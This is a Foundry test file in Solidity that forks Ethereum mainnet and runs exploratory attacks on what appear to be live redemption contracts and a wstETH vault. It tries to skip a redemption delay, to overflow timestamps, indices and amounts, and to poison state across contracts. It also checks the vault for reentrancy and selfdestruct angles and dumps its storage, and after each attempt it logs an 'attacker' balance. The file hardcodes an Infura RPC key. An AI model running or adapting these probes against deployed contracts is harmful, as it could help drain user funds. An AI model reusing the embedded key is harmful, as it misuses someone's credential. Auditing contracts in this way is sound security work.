// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

interface IwstETH {
    function wrap(uint256 stETHAmount) external returns (uint256);
    function unwrap(uint256 wstETHAmount) external returns (uint256);
    function stETH() external view returns (address);
    function getWstETHByStETH(uint256 _stETHAmount) external view returns (uint256);
    function getStETHByWstETH(uint256 _wstETHAmount) external view returns (uint256);
}

contract CreativeImmediateBypass is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TimestampEdgeCases() public {
        console.log("=== TIMESTAMP EDGE CASES ===\n");

        // What if we manipulate block.timestamp to extreme values?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption at normal time
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Check redemption data
        (bool s1, bytes memory d1) = R0.staticcall(
            abi.encodeWithSignature("getRedeemRequest(address,uint256)", attacker, 0)
        );
        console.log("Redemption data:");
        console.logBytes(d1);

        vm.stopPrank();

        // Try with timestamp at max uint32 - 7 days (overflow territory)
        uint256 maxUint32 = type(uint32).max;
        console.log("Max uint32:", maxUint32);
        console.log("Current timestamp:", block.timestamp);

        // Warp to timestamp that when adding 7 days would overflow uint32
        uint256 overflowTime = maxUint32 - 7 days + 1;
        console.log("Overflow time:", overflowTime);

        if (overflowTime > block.timestamp) {
            vm.warp(overflowTime);
            console.log("Warped to:", block.timestamp);

            // Create another redemption
            vm.startPrank(attacker);
            R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
            vm.stopPrank();

            // Warp forward minimally
            vm.warp(block.timestamp + 1);

            // Try finalize
            vm.startPrank(attacker);
            (bool fs,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 1));
            console.log("Finalize with overflow timestamp:", fs);
            console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
            vm.stopPrank();
        }
    }

    function test_ExchangeRateManipulation() public {
        console.log("=== EXCHANGE RATE MANIPULATION ===\n");

        // If we can manipulate the exchange rate, we might get more wstETH

        // Check current rates
        uint256 stEthForWst = IwstETH(wstETH).getStETHByWstETH(1e18);
        uint256 wstForStEth = IwstETH(wstETH).getWstETHByStETH(1e18);
        console.log("stETH per wstETH:", stEthForWst / 1e16, "/ 100");
        console.log("wstETH per stETH:", wstForStEth / 1e16, "/ 100");

        // Can we manipulate by doing large wraps/unwraps?
        // wstETH is a rebasing wrapper, so rate changes with Lido

        // What if we donate stETH to wstETH contract?
        // This could inflate the rate temporarily

        // Check vault's allowance to R0
        (bool sa, bytes memory da) = VAULT.staticcall(
            abi.encodeWithSignature("allowance(address,address)", VAULT, R0)
        );
        if (sa && da.length > 0) {
            console.log("Vault->R0 allowance:", abi.decode(da, (uint256)) / 1e18);
        }

        // Can we call vault directly to get funds?
        console.log("\nVault direct functions:");
        (bool s1, bytes memory d1) = VAULT.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length > 0) {
            console.log("Vault owner:", abi.decode(d1, (address)));
        }
    }

    function test_MulticallBatchExecution() public {
        console.log("=== MULTICALL BATCH EXECUTION ===\n");

        // What if we batch redeem + finalize in same tx?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Try multicall pattern
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature("redeem(uint96)", uint96(1000e18));
        calls[1] = abi.encodeWithSignature("finalizeRedeem(uint256)", 0);

        // Try to call both in sequence
        R0.call(calls[0]);
        (bool s2,) = R0.call(calls[1]);
        console.log("Same-tx finalize:", s2);

        // Check if R0 has multicall
        (bool mc,) = R0.call(abi.encodeWithSignature("multicall(bytes[])", calls));
        console.log("R0 multicall:", mc);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_IndexOverflowUnderflow() public {
        console.log("=== INDEX OVERFLOW/UNDERFLOW ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Try various index values
        uint256[] memory indices = new uint256[](6);
        indices[0] = type(uint256).max;           // Max
        indices[1] = type(uint256).max - 1;       // Max - 1
        indices[2] = type(uint128).max;           // uint128 max
        indices[3] = 2**64;                       // Large power of 2
        indices[4] = 1;                           // Out of bounds
        indices[5] = 0;                           // Valid

        console.log("Trying various indices:");
        for (uint i = 0; i < indices.length; i++) {
            (bool s,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", indices[i]));
            console.log("Index test %d: %s", i, s);
        }

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_AmountEdgeCases() public {
        console.log("=== AMOUNT EDGE CASES ===\n");

        deal(TASSET, attacker, type(uint256).max);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Try various amounts
        uint96[] memory amounts = new uint96[](5);
        amounts[0] = 0;                           // Zero
        amounts[1] = 1;                           // Dust
        amounts[2] = type(uint96).max;            // Max uint96
        amounts[3] = type(uint96).max - 1;        // Max - 1
        amounts[4] = 1000e18;                     // Normal

        console.log("Trying various amounts:");
        for (uint i = 0; i < amounts.length; i++) {
            (bool s,) = R0.call(abi.encodeWithSignature("redeem(uint96)", amounts[i]));
            console.log("Amount %d: success=%s", i, s);
        }

        // Check redemption count
        (bool sc, bytes memory dc) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (sc) {
            console.log("Redemption count:", abi.decode(dc, (uint256)));
        }

        vm.stopPrank();
    }

    function test_CrossContractStatePoisoning() public {
        console.log("=== CROSS-CONTRACT STATE POISONING ===\n");

        // What if we create state on R1 that affects R0?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        IERC20(TASSET).approve(R1, type(uint256).max);
        IERC20(TASSET).approve(RC, type(uint256).max);

        // Create redemption on R0
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Try to manipulate via R1
        R1.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Try to manipulate via RC
        RC.call(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker));

        vm.stopPrank();

        // Check states
        (bool s1, bytes memory d1) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        (bool s2, bytes memory d2) = R1.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );

        if (s1) console.log("R0 redemptions:", abi.decode(d1, (uint256)));
        if (s2) console.log("R1 redemptions:", abi.decode(d2, (uint256)));

        // Try to finalize R0 immediately
        vm.startPrank(attacker);
        (bool f1,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("R0 immediate finalize:", f1);
        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_ReentrancyViaPermit() public {
        console.log("=== REENTRANCY VIA PERMIT ===\n");

        // If TASSET has permit, can we use it to create reentrancy?

        // Check if TASSET supports permit
        bytes4 permitSig = bytes4(keccak256("permit(address,address,uint256,uint256,uint8,bytes32,bytes32)"));
        (bool s1, bytes memory d1) = TASSET.staticcall(abi.encodeWithSelector(permitSig));
        console.log("TASSET permit call:", s1);

        // Check for DOMAIN_SEPARATOR
        (bool s2,) = TASSET.staticcall(abi.encodeWithSignature("DOMAIN_SEPARATOR()"));
        console.log("TASSET DOMAIN_SEPARATOR:", s2);

        // Check for nonces
        (bool s3,) = TASSET.staticcall(abi.encodeWithSignature("nonces(address)", attacker));
        console.log("TASSET nonces:", s3);
    }

    function test_ZeroValueAttacks() public {
        console.log("=== ZERO VALUE ATTACKS ===\n");

        // What if we can create a zero-value redemption that bypasses checks?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Try zero amount
        (bool s1,) = R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(0)));
        console.log("Zero redeem:", s1);

        // Try min possible
        (bool s2,) = R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1)));
        console.log("Min redeem:", s2);

        // Check if we got a redemption
        (bool sc, bytes memory dc) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (sc) {
            uint256 count = abi.decode(dc, (uint256));
            console.log("Redemption count:", count);

            if (count > 0) {
                // Try immediate finalize
                (bool f,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
                console.log("Immediate finalize:", f);
            }
        }

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_SelfDestructAttack() public {
        console.log("=== SELFDESTRUCT ATTACK ===\n");

        // Can we selfdestruct funds into vault to affect calculations?

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Get wstETH
        deal(wstETH, attacker, 1000e18);

        vm.startPrank(attacker);

        // Deploy selfdestruct contract with wstETH
        SelfDestructFunder funder = new SelfDestructFunder();
        IERC20(wstETH).transfer(address(funder), 100e18);

        // Check vault balance doesn't change via selfdestruct (ERC20 not ETH)
        // Selfdestruct only sends ETH, not ERC20

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault after:", vaultAfter / 1e18);
    }

    function test_VaultStorageManipulation() public {
        console.log("=== VAULT STORAGE ANALYSIS ===\n");

        // Analyze vault's storage to find potential manipulation points

        console.log("Vault:", VAULT);

        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);

                address addr = address(uint160(uint256(slot)));
                if (addr.code.length > 0) {
                    console.log("  -> Contract:", addr);
                }
            }
        }

        // Check EIP-1967 slots for vault
        bytes32 implSlot = vm.load(VAULT, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        console.log("\nVault implementation slot:");
        console.logBytes32(implSlot);

        address vaultImpl = address(uint160(uint256(implSlot)));
        if (vaultImpl != address(0)) {
            console.log("Vault is a proxy! Implementation:", vaultImpl);
        }
    }
}

contract SelfDestructFunder {
    function destroy(address payable to) external {
        selfdestruct(to);
    }
}
